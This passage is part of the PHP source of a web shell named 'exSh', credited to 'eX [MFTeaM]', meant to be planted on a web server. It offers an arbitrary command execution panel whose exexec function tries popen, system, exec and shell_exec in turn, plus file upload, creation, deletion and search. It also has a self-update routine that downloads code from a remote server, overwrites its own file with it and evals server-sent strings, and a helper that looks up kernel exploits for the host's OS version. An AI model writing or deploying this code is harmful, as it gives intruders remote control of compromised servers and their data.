"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_tar"=&gt;
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_txt"=&gt;
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_wri"=&gt;
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=&gt;
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7"
);
//Untuk optimalisasi ukuran dan kecepatan.
$imgequals = array(
  "ext_tar"=&gt;array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
  "ext_php"=&gt;array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
  "ext_jpg"=&gt;array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
  "ext_html"=&gt;array("ext_html","ext_htm"),
  "ext_avi"=&gt;array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
  "ext_lnk"=&gt;array("ext_lnk","ext_url"),
  "ext_ini"=&gt;array("ext_ini","ext_css","ext_inf"),
  "ext_doc"=&gt;array("ext_doc","ext_dot"),
  "ext_js"=&gt;array("ext_js","ext_vbs"),
  "ext_cmd"=&gt;array("ext_cmd","ext_bat","ext_pif"),
  "ext_wri"=&gt;array("ext_wri","ext_rtf"),
  "ext_swf"=&gt;array("ext_swf","ext_fla"),
  "ext_mp3"=&gt;array("ext_mp3","ext_au","ext_midi","ext_mid"),
  "ext_htaccess"=&gt;array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
);
if (!$getall) {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=&gt;$v) {if (in_array($img,$v)) {$img = $k; break;}}
  if (empty($images[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($images[$img]);
}
else {
  foreach($imgequals as $a=&gt;$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]&lt;br&gt;");}}}}
  natsort($images);
  $k = array_keys($images);
  echo  "&lt;center&gt;";
  foreach ($k as $u) {echo $u.":&lt;img src=\"".$surl."act=img&img=".$u."\" border=\"1\"&gt;&lt;br&gt;";}
  echo "&lt;/center&gt;";
}
exit;
}
if ($act == "about") {
  echo "&lt;center&gt;&lt;b&gt;Credits:&lt;/b&gt;&lt;br&gt;Idea, leading and coding by &lt;b&gt;eX [MFTeaM]&lt;/b&gt;&lt;br&gt;".
       "Beta-testing and some tips by &lt;b&gt;eX [CopyRight MFTeaM]&lt;/b&gt;&lt;br&gt;".
       "Re-Coding, tricks, html and css by &lt;b&gt;eX [MFTeaM]&lt;/b&gt;&lt;br&gt;&lt;br&gt;".
       "Report bugs to &lt;a href=\"mailto:eX@MFTeaM.NeT\"&gt;eX&lt;/a&gt;&lt;/b&gt;";
}
echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n";
/*** COMMANDS PANEL ***/
?&gt;
&lt;div  class=bartitle&gt;&lt;b&gt;.: COMMANDS PANEL :.&lt;/b&gt;&lt;/div&gt;
&lt;table class=mainpanel&gt;
&lt;tr&gt;&lt;td align=right&gt;Command:&lt;/td&gt;
&lt;td&gt;&lt;form method="POST"&gt;
    &lt;input type=hidden name=act value="cmd"&gt;
    &lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
    &lt;input type="text" name="cmd" size="100" value="&lt;?php echo htmlspecialchars($cmd); ?&gt;"&gt;
    &lt;input type=hidden name="cmd_txt" value="1"&gt; &lt;input type=submit name=submit value="Execute"&gt;
    &lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=right&gt;Quick Commands:&lt;/td&gt;
&lt;td&gt;&lt;form method="POST"&gt;
    &lt;input type=hidden name=act value="cmd"&gt;
    &lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
    &lt;input type=hidden name="cmd_txt" value="1"&gt;
    &lt;select name="cmd"&gt;
    &lt;?php
    foreach ($cmdaliases as $als) {
      echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";
    }
    foreach ($cmdaliases2 as $als) {
      echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";
    }
    ?&gt;
    &lt;/select&gt; &lt;input type=submit name=submit value="Execute"&gt;
    &lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=right&gt;Upload:&lt;/td&gt;
&lt;td&gt;&lt;form method="POST" enctype="multipart/form-data"&gt;
    &lt;input type=hidden name=act value="upload"&gt;
    &lt;input type=hidden name="miniform" value="1"&gt;
    &lt;input type="file" name="uploadfile"&gt; &lt;input type=submit name=submit value="Upload"&gt; &lt;?php echo $wdt." Max size: ". @ini_get("upload_max_filesize")."B"; ?&gt;
    &lt;/form&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=right&gt;PHP Filesystem:&lt;/td&gt;
&lt;td&gt;
&lt;?php ##[ eX TriCkz ]## ?&gt;
&lt;script language="javascript"&gt;
function set_arg(txt1,txt2) {
  document.forms.fphpfsys.phpfsysfunc.value.selected = "Download";
  document.forms.fphpfsys.arg1.value = txt1;
  document.forms.fphpfsys.arg2.value = txt2;
}
function chg_arg(num,txt1,txt2) {
  if (num==0) {
    document.forms.fphpfsys.arg1.type = "hidden";
    document.forms.fphpfsys.A1.type = "hidden";
  }
  if (num&lt;=1) {
    document.forms.fphpfsys.arg2.type = "hidden";
    document.forms.fphpfsys.A2.type = "hidden";
  }
  if (num==2) {
    document.forms.fphpfsys.A1.type = "label";
    document.forms.fphpfsys.A2.type = "label";
    document.forms.fphpfsys.arg1.type = "text";
    document.forms.fphpfsys.arg2.type = "text";
  }
  document.forms.fphpfsys.A1.value = txt1 + ":";
  document.forms.fphpfsys.A2.value = txt2 + ":";
}
&lt;/script&gt;
&lt;?php
  echo "&lt;form name=\"fphpfsys\" method=\"POST\"&gt;&lt;input type=hidden name=act value=\"phpfsys\"&gt;&lt;input type=hidden name=d value=\"$dispd\"&gt;\r\n".
       "&lt;select name=\"phpfsysfunc\"&gt;\r\n";
  foreach ($phpfsaliases as $als) {
    if ($als[1]==$phpfsysfunc) {
      echo "&lt;option selected value=\"".$als[1]."\" onclick=\"chg_arg('$als[2]','$als[3]','$als[4]')\"&gt;".$als[0]."&lt;/option&gt;\r\n";
    }
    else {
      echo "&lt;option value=\"".$als[1]."\" onclick=\"chg_arg('$als[2]','$als[3]','$als[4]')\"&gt;".$als[0]."&lt;/option&gt;\r\n";
    }
  }
  echo "&lt;/select&gt;\r\n".
       "&lt;input type=label name=A1 value=\"File:\" size=2 disabled&gt; &lt;input type=text name=arg1 size=40 value=\"".htmlspecialchars($arg1)."\"&gt;\r\n".
       "&lt;input type=hidden name=A2 size=2 disabled&gt; &lt;input type=hidden name=arg2 size=50 value=\"".htmlspecialchars($arg2)."\"&gt;\r\n".
       "&lt;input type=submit name=submit value=\"Execute\"&gt;&lt;hr noshade size=1&gt;\r\n";
  foreach ($sh_sourcez as $e =&gt; $o) {
    echo "&lt;input type=button value=\"$e\" onclick=\"set_arg('$o[0]','$o[1]')\"&gt;\r\n";
  }
  echo "&lt;/form&gt;\r\n";
?&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=right&gt;Search File:&lt;/td&gt;
&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="search"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
    &lt;input type="text" name="search_name" size="29" value="(.*)"&gt; &lt;input type="checkbox" name="search_name_regexp" value="1" checked&gt; regexp &lt;input type=submit name=submit value="Search"&gt;
    &lt;/form&gt;
    &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=right&gt;Create File:&lt;/td&gt;
&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="mkfile"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;&lt;input type=hidden name="ft" value="edit"&gt;
    &lt;input type="text" name="mkfile" size="70" value="&lt;?php echo $dispd; ?&gt;"&gt; &lt;input type="checkbox" name="overwrite" value="1" checked&gt; Overwrite &lt;input type=submit value="Create"&gt; &lt;?php echo $wdt; ?&gt;
    &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td align=right&gt;View File:&lt;/td&gt;
&lt;td&gt;&lt;form method="POST"&gt;&lt;input type=hidden name=act value="gofile"&gt;&lt;input type=hidden name="d" value="&lt;?php echo $dispd; ?&gt;"&gt;
    &lt;input type="text" name="f" size="70" value="&lt;?php echo $dispd; ?&gt;"&gt; &lt;input type=submit value="View"&gt;
    &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;?php footer(); ?&gt;
&lt;/body&gt;&lt;/html&gt;
&lt;?php

###########################
## exSh CORE FUNCTIONS ##
###########################
function safemode() {
  if ( @ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) { return TRUE; }
  else { return FALSE; }
}
function getdisfunc() {
  $disfunc = @ini_get("disable_functions");
  if (!empty($disfunc)) {
    $disfunc = str_replace(" ","",$disfunc);
    $disfunc = explode(",",$disfunc);
  }
  else { $disfunc= array(); }
  return $disfunc;
}
function enabled($func) {
 if ( is_callable($func) && !in_array($func,getdisfunc()) ) { return TRUE; }
 else { return FALSE; }
}
function exexec($cmd) {
  $output = "";
  if ( enabled("popen") ) {
    $h = popen($cmd.' 2&gt;&1', 'r');
    if ( is_resource($h) ) {
      while ( !feof($h) ) { $output .= fread($h, 2096);  }
      pclose($h);
    }
  }
  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }
  elseif ( enabled("shell_exec") ) { $output = shell_exec($cmd); }
  return $output;
}
function exexec2($cmd) {
  $output = "";
  if ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }
  elseif ( enabled("shell_exec") ) { $output = shell_exec($cmd); }
  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("popen") ) {
    $h = popen($cmd.' 2&gt;&1', 'r');
    if ( is_resource($h) ) {
      while ( !feof($h) ) { $output .= fread($h, 2096);  }
      pclose($h);
    }
  }
  return $output;
}
function which($pr) {
  $path = exexec("which $pr");
  if(!empty($path)) { return $path; } else { return $pr; }
}

function get_status() {
  function showstat($sup,$stat) {
    if ($stat=="on") { return "$sup: &lt;font color=#00FF00&gt;&lt;b&gt;ON&lt;/b&gt;&lt;/font&gt;"; }
    else { return "$sup: &lt;font color=#FF9900&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;"; }
  }
  $arrfunc = array(
    array("MySQL","mysql_connect"),
    array("MSSQL","mssql_connect"),
    array("Oracle","ocilogon"),
    array("PostgreSQL","pg_connect"),
    array("Curl","curl_version"),
  );
  $arrcmd = array(
    array("Fetch","fetch --help"),
    array("Wget","wget --help"),
    array("Perl","perl -v"),
  );

  $statinfo = array();
  foreach ($arrfunc as $func) {
    if (function_exists($func[1])) { $statinfo[] = showstat($func[0],"on"); }
    else { $statinfo[] = showstat($func[0],"off"); }
  }
  $statinfo[] = (@extension_loaded('sockets'))?showstat("Sockets","on"):showstat("Sockets","off");
  foreach ($arrcmd as $cmd) {
    if (exexec2($cmd[1])) { $statinfo[] = showstat($cmd[0],"on"); }
    else { $statinfo[] = showstat($cmd[0],"off"); }
  }
  return implode(" ",$statinfo);
}
function showdisfunc() {
  if ($disablefunc = @ini_get("disable_functions")) {
    return "&lt;font color=#FF9900&gt;&lt;b&gt;".$disablefunc."&lt;/b&gt;&lt;/font&gt;";
  }
  else { return "&lt;font color=#00FF00&gt;&lt;b&gt;NONE&lt;/b&gt;&lt;/b&gt;&lt;/font&gt;"; }
}
function disp_drives($curdir,$surl) {
  $letters = "";
  $v = explode("\\",$curdir);
  $v = $v[0];
  foreach (range("A","Z") as $letter) {
    $bool = $isdiskette = $letter == "A";
    if (!$bool) { $bool = is_dir($letter.":\\"); }
    if ($bool) {
      $letters .= "&lt;a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".
                  ($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly!')\"":"")."&gt; ";
      if ($letter.":" != $v) { $letters .= $letter; }
      else { $letters .= "&lt;font color=yellow&gt;".$letter."&lt;/font&gt;"; }
      $letters .= "&lt;/a&gt; ";
    }
  }
  if (!empty($letters)) { Return $letters; }
  else  {Return "None"; }
}
function disp_freespace($curdrv) {
  $free = @disk_free_space($curdrv);
  $total = @disk_total_space($curdrv);
  if ($free === FALSE) { $free = 0; }
  if ($total === FALSE) { $total = 0; }
  if ($free &lt; 0) { $free = 0; }
  if ($total &lt; 0) { $total = 0; }
  $used = $total-$free;
  $free_percent = round(100/($total/$free),2)."%";
  $free = view_size($free);
  $total = view_size($total);
  return "$free of $total ($free_percent)";
}
## exSh UPDATE FUNCTIONS ##
function exgetsource($fn) {
  global $exsh_sourcesurl;
  $array = array(
    "exsh.php" =&gt; "exsh.txt",
  );
  $name = $array[$fn];
  if ($name) {return file_get_contents($exsh_sourcesurl.$name);}
  else {return FALSE;}
}
function exsh_getupdate($update = TRUE) {
  $url = $GLOBALS["exsh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["sh_ver"]))."&updatenow=".($updatenow?"1":"0");
  $data = @file_get_contents($url);
  if (!$data) { return "Can't connect to update-server!"; }
  else {
    $data = ltrim($data);
    $string = substr($data,3,ord($data{2}));
    if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;}
    if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
    if ($data{0} == "\x99" and $data{1} == "\x03") {
      $string = explode("|",$string);
      if ($update) {
        $confvars = array();
        $sourceurl = $string[0];
        $source = file_get_contents($sourceurl);
        if (!$source) {return "Can't fetch update!";}
        else {
          $fp = fopen(__FILE__,"w");
          if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download exshell.php manually &lt;a href=\"".$sourceurl."\"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;.";}
          else {
            fwrite($fp,$source);
            fclose($fp);
            return "Update completed!";
          }
        }
      }
      else {return "New version are available: ".$string[1];}
    }
    elseif ($data{0} == "\x99" and $data{1} == "\x04") {
      eval($string);
      return 1;
    }
    else {return "Error in protocol: segmentation failed! (".$data.") ";}
  }
}
function ex_buff_prepare() {
  global $sess_data;
  global $act;
  foreach($sess_data["copy"] as $k=&gt;$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
  foreach($sess_data["cut"] as $k=&gt;$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
  $sess_data["copy"] = array_unique($sess_data["copy"]);
  $sess_data["cut"] = array_unique($sess_data["cut"]);
  sort($sess_data["copy"]);
  sort($sess_data["cut"]);
  if ($act != "copy") {foreach($sess_data["cut"] as $k=&gt;$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
  else {foreach($sess_data["copy"] as $k=&gt;$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
function ex_sess_put($data) {
  global $sess_cookie;
  global $sess_data;
  ex_buff_prepare();
  $sess_data = $data;
  $data = serialize($data);
  setcookie($sess_cookie,$data);
}
## END exSh UPDATE FUNCTIONS ##
## FILESYSTEM FUNCTIONS ##
function fs_copy_dir($d,$t) {
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $h = opendir($d);
  while (($o = readdir($h)) !== FALSE) {
    if (($o != ".") and ($o != "..")) {
      if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
      else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
      if (!$ret) {return $ret;}
    }
  }
  closedir($h);
  return TRUE;
}
function fs_copy_obj($d,$t) {
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
  if (!is_dir(dirname($t))) {mkdir(dirname($t));}
  if (is_dir($d)) {
    if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
    if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
    return fs_copy_dir($d,$t);
  }
  elseif (is_file($d)) { return copy($d,$t); }
  else { return FALSE; }
}
function fs_move_dir($d,$t) {
  $h = opendir($d);
  if (!is_dir($t)) {mkdir($t);}
  while (($o = readdir($h)) !== FALSE) {
    if (($o != ".") and ($o != "..")) {
      $ret = TRUE;
      if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
      else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
      if (!$ret) {return $ret;}
     }
   }
  closedir($h);
  return TRUE;
}
function fs_move_obj($d,$t) {
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
  if (is_dir($d)) {
    if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
    if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
    return fs_move_dir($d,$t);
  }
  elseif (is_file($d)) {
    if(copy($d,$t)) {return unlink($d);}
    else {unlink($t); return FALSE;}
  }
  else {return FALSE;}
}
function fs_rmdir($d) {
  $h = opendir($d);
  while (($o = readdir($h)) !== FALSE) {
    if (($o != ".") and ($o != "..")) {
      if (!is_dir($d.$o)) {unlink($d.$o);}
      else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
    }
  }
  closedir($h);
  rmdir($d);
  return !is_dir($d);
}
function fs_rmobj($o) {
  $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
  if (is_dir($o)) {
    if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
    return fs_rmdir($o);
  }
  elseif (is_file($o)) {return unlink($o);}
  else {return FALSE;}
}
## END FILESYSTEM FUNCTIONS ##
function onphpshutdown() {
  global $gzipencode,$ft;
  if (!headers_sent() and $gzipencode and !in_array($ft,array("img","download","notepad"))) {
    $v = @ob_get_contents();
    @ob_end_clean();
    @ob_start("ob_gzHandler");
    echo $v;
    @ob_end_flush();
  }
}
function exshexit() { onphpshutdown(); exit; }

function exfsearch($d) {
  global $found, $found_d, $found_f, $search_i_f, $search_i_d, $a;
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $h = opendir($d);
  while (($f = readdir($h)) !== FALSE) {
    if($f != "." && $f != "..") {
      $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
      if (is_dir($d.$f)) {
        $search_i_d++;
        if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
        if (!is_link($d.$f)) {exfsearch($d.$f);}
      }
      else {
        $search_i_f++;
        if ($bool) {
          if (!empty($a["text"])) {
            $r = @file_get_contents($d.$f);
            if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
            if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
            if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
            else {$bool = strpos(" ".$r,$a["text"],1);}
            if ($a["text_not"]) {$bool = !$bool;}
            if ($bool) {$found[] = $d.$f; $found_f++;}
          }
          else {$found[] = $d.$f; $found_f++;}
        }
      }
    }
  }
  closedir($h);
}
function view_size($size) {
  if (!is_numeric($size)) { return FALSE; }
  else {
    if ($size &gt;= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
    elseif ($size &gt;= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
    elseif ($size &gt;= 1024) {$size = round($size/1024*100)/100 ." KB";}
    else {$size = $size . " B";}
    return $size;
  }
}
function tabsort($a,$b) { global $v; return strnatcmp($a[$v], $b[$v]);}
function view_perms($mode) {
  if (($mode & 0xC000) === 0xC000) {$type = "s";}
  elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
  elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
  elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
  elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
  elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
  elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
  else {$type = "?";}
  $owner["read"] = ($mode & 00400)?"r":"-";
  $owner["write"] = ($mode & 00200)?"w":"-";
  $owner["execute"] = ($mode & 00100)?"x":"-";
  $group["read"] = ($mode & 00040)?"r":"-";
  $group["write"] = ($mode & 00020)?"w":"-";
  $group["execute"] = ($mode & 00010)?"x":"-";
  $world["read"] = ($mode & 00004)?"r":"-";
  $world["write"] = ($mode & 00002)? "w":"-";
  $world["execute"] = ($mode & 00001)?"x":"-";
  if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
  if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
  if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
  return $type.join("",$owner).join("",$group).join("",$world);
}
function parse_perms($mode) {
  if (($mode & 0xC000) === 0xC000) {$t = "s";}
  elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
  elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
  elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
  elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
  elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
  elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
  else {$t = "?";}
  $o["r"] = ($mode & 00400) &gt; 0; $o["w"] = ($mode & 00200) &gt; 0; $o["x"] = ($mode & 00100) &gt; 0;
  $g["r"] = ($mode & 00040) &gt; 0; $g["w"] = ($mode & 00020) &gt; 0; $g["x"] = ($mode & 00010) &gt; 0;
  $w["r"] = ($mode & 00004) &gt; 0; $w["w"] = ($mode & 00002) &gt; 0; $w["x"] = ($mode & 00001) &gt; 0;
  return array("t"=&gt;$t,"o"=&gt;$o,"g"=&gt;$g,"w"=&gt;$w);
}
function parsesort($sort) {
  $one = intval($sort);
  $second = substr($sort,-1);
  if ($second != "d") {$second = "a";}
  return array($one,$second);
}
function view_perms_color($o) {
  if (!is_readable($o)) {return "&lt;font color=red&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
  elseif (!is_writable($o)) {return "&lt;font color=white&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
  else {return "&lt;font color=green&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
}
function str2mini($content,$len) {
  if (strlen($content) &gt; $len) {
    $len = ceil($len/2) - 2;
    return substr($content, 0,$len)."...".substr($content,-$len);
  } else {return $content;}
}
function strips(&$arr,$k="") {
  if (is_array($arr)) { foreach($arr as $k=&gt;$v) { if (strtoupper($k) != "GLOBALS") { strips($arr["$k"]); } } }
  else { $arr = stripslashes($arr); }
}

function getmicrotime() {
  list($usec, $sec) = explode(" ", microtime());
  return ((float)$usec + (float)$sec);
}

function milw0rm() {
  $Lversion = php_uname(r);
  $OSV = php_uname(s);
  if(eregi("Linux",$OSV)) {
    $Lversion = substr($Lversion,0,6);
    return "http://milw0rm.com/search.php?dong=Linux Kernel ".$Lversion;
  } else {
    $Lversion = substr($Lversion,0,3);
    return "http://milw0rm.com/search.php?dong=".$OSV." ".$Lversion;
  }
}
function tools() {
  echo "List of tools";
}

function sh_name() { return ("MFTeaM").sh_ver; }
function htmlhead($safemode) {
$style = '
&lt;style type="text/css"&gt;
body,table {font:8pt verdana;background-color:black;}
table {width:100%;}
table,td,#maininfo td {padding:3px;}
table,td,input,select,option {border:1px solid #808080;}
body,table,input,select,option {color:#FFFFFF;}
a {color:lightblue;text-decoration:none; } a:link {color:#5B5BFF;} a:hover {text-decoration:underline;} a:visited {color:#99CCFF;}
textarea {color:#dedbde;font:8pt Courier New;border:1px solid #666666;margin:2;}
#pagebar {padding:5px;border:3px solid #1E1E1E;border-collapse:collapse;}
#pagebar td {vertical-align:top;}
#pagebar,#pagebar p,.info,input,select,option {font:8pt tahoma;}
#pagebar a {font-weight:bold;color:#00FF00;}
#pagebar a:visited {color:#00CE00;}
#mainmenu {text-align:center;}
#mainmenu a {text-align: center;padding: 0px 5px 0px 5px;}
#maininfo,.barheader,.bartitle {text-align:center;}
.fleft {float:left;text-align:left;}
.fright {float:right;text-align:right;}
.bartitle {padding:5px;border:2px solid #1F1F1F;}
.barheader {font-weight:bold;padding:5px;}
.info,.info td,.info th {margin:0;padding:0;border-collapse:collapse;}
.info th {color:#00FF00;text-align:left;width:13%;}
.contents,.explorer {border-collapse:collapse;}
.contents,.explorer td,th {vertical-align:top;}
.mainpanel {border-collapse:collapse;padding:5px;}
.barheader,.mainpanel table,td {border:1px solid #333333;}
input[type="submit"],input[type="button"] {border:1px solid #000000;}
input[type="text"] {padding:3px;}
.shell {background-color:#000000;color:#00FF00;padding:5px;font-size:12;}
.fxerrmsg {color:red; font-weight:bold;}
#pagebar,#pagebar p,h1,h2,h3,h4,form {margin:0;}
#pagebar,.mainpanel,input[type="submit"],input[type="button"] {background-color:#4A4A4A;}
